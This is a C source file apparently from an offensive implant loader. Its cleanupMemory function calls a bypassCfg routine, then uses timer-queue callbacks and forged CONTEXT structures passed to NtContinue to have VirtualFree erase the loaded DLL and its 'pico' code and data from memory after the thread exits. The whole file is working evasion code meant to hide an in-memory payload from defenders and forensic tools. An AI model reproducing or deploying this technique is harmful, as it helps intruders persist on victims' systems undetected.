#include <windows.h>
#include "bud.h"
#include "tcg.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateTimerQueue( );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateTimerQueueTimer( PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap( );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$RtlCaptureContext( PCONTEXT );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep( DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue( CONTEXT *, BOOLEAN );

#define memcpy(x, y, z) __movsb( ( u_char* )( x ), ( u_char* )( y ), z );
#define memset(dst, src, len) __stosb( ( u_char* )( dst ), src, len );

extern PALLOCATED_MEMORY g_memory;
extern BOOL bypassCfg( PVOID );

void cleanupMemory( )
{
    if ( !bypassCfg( NTDLL$NtContinue )) {
        return;
    }

    CONTEXT ctx;
    memset( &ctx, 0, sizeof(CONTEXT) );
    ctx.ContextFlags = CONTEXT_ALL;

    HANDLE timer_queue = KERNEL32$CreateTimerQueue( ), timer = NULL;

    if ( KERNEL32$CreateTimerQueueTimer( &timer, timer_queue, ( WAITORTIMERCALLBACK )( KERNEL32$RtlCaptureContext ), &ctx, 0, 0, WT_EXECUTEINTIMERTHREAD ))
    {
        /* give RtlCaptureContext a chance to run */
        KERNEL32$Sleep( 100 );
            
        if ( ctx.Rip != 0 )
        {
            #define CTX_COUNT 3

            HANDLE    heap     = KERNEL32$GetProcessHeap( );
            PCONTEXT  ctx_free = ( PCONTEXT ) ( KERNEL32$HeapAlloc( heap, HEAP_ZERO_MEMORY, sizeof(CONTEXT) * CTX_COUNT ));

            for ( int i = 0; i < CTX_COUNT; i++ ) { 
                memcpy( &ctx_free[i], &ctx, sizeof(CONTEXT) );
            }

            /*
             * we use VirtualFree here because
             * the loader uses VirtualAlloc
             */

            /* the dll */
            ctx_free[0].Rsp -= sizeof( PVOID );
            ctx_free[0].Rip  = ( DWORD64 )( KERNEL32$VirtualFree );
            ctx_free[0].Rcx  = ( DWORD64 )( g_memory->memoryRegions[0].allocationBase );
            ctx_free[0].Rdx  = ( DWORD64 )( 0 );
            ctx_free[0].R8   = ( DWORD64 )( MEM_RELEASE );

            /* pico data */
            ctx_free[1].Rsp -= sizeof( PVOID );
            ctx_free[1].Rip  = ( DWORD64 )( KERNEL32$VirtualFree );
            ctx_free[1].Rcx  = ( DWORD64 )( g_memory->memoryRegions[1].allocationBase );
            ctx_free[1].Rdx  = ( DWORD64 )( 0 );
            ctx_free[1].R8   = ( DWORD64 )( MEM_RELEASE );

            /* pico code */
            ctx_free[2].Rsp -= sizeof( PVOID );
            ctx_free[2].Rip  = ( DWORD64 )( KERNEL32$VirtualFree );
            ctx_free[2].Rcx  = ( DWORD64 )( g_memory->memoryRegions[2].allocationBase );
            ctx_free[2].Rdx  = ( DWORD64 )( 0 );
            ctx_free[2].R8   = ( DWORD64 )( MEM_RELEASE );

            /* give a decent delay so ExitThread has time to be called */
            KERNEL32$CreateTimerQueueTimer( &timer, timer_queue, ( WAITORTIMERCALLBACK )( NTDLL$NtContinue ), &ctx_free[0], 500, 0, WT_EXECUTEINTIMERTHREAD );
            KERNEL32$CreateTimerQueueTimer( &timer, timer_queue, ( WAITORTIMERCALLBACK )( NTDLL$NtContinue ), &ctx_free[1], 500, 0, WT_EXECUTEINTIMERTHREAD );
            KERNEL32$CreateTimerQueueTimer( &timer, timer_queue, ( WAITORTIMERCALLBACK )( NTDLL$NtContinue ), &ctx_free[2], 500, 0, WT_EXECUTEINTIMERTHREAD );
        }
    }
}

void setupCleanup( PALLOCATED_MEMORY memory )
{   
    if ( memory != NULL ) {
        g_memory = memory;
    }   
}
